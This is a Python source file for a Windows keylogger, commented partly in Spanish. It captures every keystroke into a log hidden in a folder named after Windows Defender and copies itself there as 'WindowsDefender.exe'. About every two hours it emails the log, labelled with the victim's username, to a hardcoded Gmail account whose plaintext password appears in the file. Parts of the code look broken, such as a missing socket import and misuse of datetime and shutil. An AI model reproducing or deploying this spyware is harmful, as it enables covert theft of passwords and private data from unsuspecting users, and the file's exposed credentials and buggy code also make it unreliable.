###################################
# Keylogger to be used in Windows #
###################################
from pynput.keyboard import Key, Listener
import pynput
from datetime import datetime
import os
import time
import yagmail
from apscheduler.schedulers.blocking import BlockingScheduler
from multiprocessing import Process
import threading
from getpass import getuser

############
# Keylogger function
# You can change the directory and/or name of the log "keylog.txt"
# If no directory is entered but only file name, it saves where the keylogger is
# Only emits new line/linebreak when user presses enter or Tab
# Uses file write to insert into log, listener from pynput to grab keystrokes
############
def Klogger():
    
    log = os.environ.get(
        'pylogger_file',
        os.path.expanduser('C:\\Users\\Public\\Security\\Windows Defender\\log.txt')
    )
    mifecha = datetime.datetime.now()
    timi = "Fecha:      ["+  mifecha.strftime("%A") + " " + mifecha.strftime("%d") + " de " + mifecha.strftime("%B") + "]\nHora:       [" + mifecha.strftime("%I")+ ":"+ mifecha.strftime("%M")+ " "+ mifecha.strftime("%p")+ " con " + mifecha.strftime("%S") +" Segundos]\n"

    with open (log, "a") as f:
        f.write("\n--------------------------------------------\nUserName:   ["+str(getuser()) +"]\n"+ str(timi)+"--------------------------------------------\n\n")

    def on_press(key):
        #print("-------")
        with open(log, "a") as f:
            if isinstance(key, pynput.keyboard.KeyCode): #convierte las teclas 0-9, a-z a codigo normal
                f.write('{}'.format(key.char))
            elif str(key) == "Key.space" :                                        
                f.write(' ')
            elif str(key) == "Key.backspace":                                           # Fixed Key.backspace
                f.write("[-]") 
            elif str(key) == "Key.enter":                                               # Fixed Key.enter
                f.write('\n') 
            elif str(key) == "Key.tab":                                               # Fixed Key.enter
                f.write('   ')
            elif str(key) == "´" or str(key) == "Key.caps_lock" or str(key) == "´" or str(key) == "Key.shift_r" or str(key) == "Key.shift" or str(key) == "Key.ctrl_l" or str(key) == "Key.ctrl_r" or str(key) == "Key.cmd" or str(key) == "Key.alt_r" or str(key) == "Key.alt_l" or str(key) == "Key.left" or str(key) == "Key.up" or str(key) == "Key.right" or str(key) == "Key.down":
                pass 
            elif str(key) == "Key.print_screen" or str(key) == "Key.media_volume_up" or str(key) == "Key.media_volume_mute" or str(key) == "None" or str(key) == "Key.media_next" or str(key) == "Key.num_lock" or str(key) == "Key.media_volume_mute" or str(key) == "Key.media_previous" or str(key) == "Key.media_play_pause" :
                pass   
            else:
                f.write('{}'.format(key))

    with Listener(on_press=on_press) as listener:
        listener.join()


def VerificarConexion():
    #creamos el socket de conexion
    con = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    #intenta conectarse a una url con el socket creado
    try:
        con.connect(('www.google.com', 80))
        #si funciona correctamente continua y ejecuta la salida en pantalla
        print ("online")
        return True 
    except:
        #si existe un error en la ejecucion del conector ejecuta la salidad de pantalla offline
        print ("offline")
        return False
    #cierra el conector
    con.close()
def CopyKey():
    
    filePath = "WindowsDefender.exe", "C:\\Users\\Public\\Security\\Windows Defender\\WindowsDefender.exe"

    try:
         #Verificar si el archivo existe 
        
        with open(filePath, 'r') as f:
            print("El archivo Existe")
    except :
        print("El archivo no existe")
        try:
            import shutil
            shutil.copy(filePath)
            #Copia el keylogger a la carpeta especifica,
            #Solos si no existe
            print("Se creó el Archivo")
        except:
            print("No se puedo crear el archivo")
       

def Rename(name):
    # Copia el archivo 
    Original = "C:\\Users\\Public\\Security\\Windows Defender\\log.txt"
    New= "C:\\Users\\Public\\Security\\Windows Defender\\"+ name + ".txt"
    os.rename(Original, New)



###############
# Function using yagmail to send the log file
# This email is open to testing purposes for the next 2 weeks
###############
def sendLog(log):
    try:
        mifecha = datetime.datetime.now()
        sender_email = "kloggertest42069@gmail.com" #Insert your email here
        receiver_email = "kloggertest42069@gmail.com" #and here

        # Si deseas enviar a más de 2 correo a la vez, usa esa parte del script
        #receiver_email = ["Correo1@gmail.com", "Correo2@gmail.com", "Correo2@gmail.com"] 

        subject = "Data | User:  "+ str(getuser()) 
        sender_password = "rotkiv1234" #email password here

        yag = yagmail.SMTP(user=sender_email, password=sender_password)
        contenido = "\nFecha: "+  mifecha.strftime("%A") + " " + mifecha.strftime("%d") + " de " + mifecha.strftime("%B") + "\nHora: " + mifecha.strftime("%I")+ ":"+ mifecha.strftime("%M")+ " "+ mifecha.strftime("%p")+ " con " + mifecha.strftime("%S") +" Segundos"
        contents = [ 
            "Información:\n\nNombre de Usuario: "+ str(getuser()) + contenido
        ]
        yag.send(receiver_email, subject, contents, attachments=log )
        print("Se envió")
        return True;
    except:
        print("No se envió")
        return False

################
# Function to schedule email
# Can set different intervals for testing purposes
# f.x "seconds = 30" to set the interval to 30 seconds
# After sending the log, deletes the log and we start a new one
################
def mailInterval():
    n = 1   # Para renombre los archivos
    while (True):
        n = n+1
        # Enviar cada 2 horas aprox
        for x in range(720):    #720
            time.sleep(10)
            print("Pasó: "+ str(x*10))

        if VerificarConexion(): # Si hay conexión
            # Crea nombre del archivo
            nameFile = "log"+str(n)
            #Renombra el archivo original
            Rename(nameFile)    # para que las nuevas teclas se envien en el siguiente tomo

            #Envía el archivo renombrado
            homedir = 'C:\\Users\\Public\\Security\\Windows Defender\\'+str(nameFile)+".txt"
            print("Proceso de envío")

            # Verifica envío Correcto
            if sendLog(homedir):
                #Si se envíó correctamente, pues elimina el archivo
                os.remove(homedir)
            else:
                # Hay internet, pero no se puedo enviar,
                # por ende el problema pudo ser las credenciales del correo, 
                # asi que se enviará con otro correo
                # time.sleep(10)
                # Enviar con otro correo y credenciales
                pass

        else:   # No hay conexión
            # Seguirá sobreescribiendo el archivo
            # No hará nada, y esperará que aya una conexión exitosa
            pass

#################
# Multi processing to run functions in parallel
# Runs the actual Keylogger in process 1
# Runs the scheduler and mail in process 2
# WARNING : Altering this will break the program
#################
if __name__ == '__main__':
    #p2 = Process(target=mailInterval)
    CopyKey()
    p1 = threading.Thread(target=Klogger)
    p2 = threading.Thread(target=mailInterval)
    p2.start()
    p1.start()
    #p1 = Process(target=Klogger)
    p1.join()
    #p2.join()

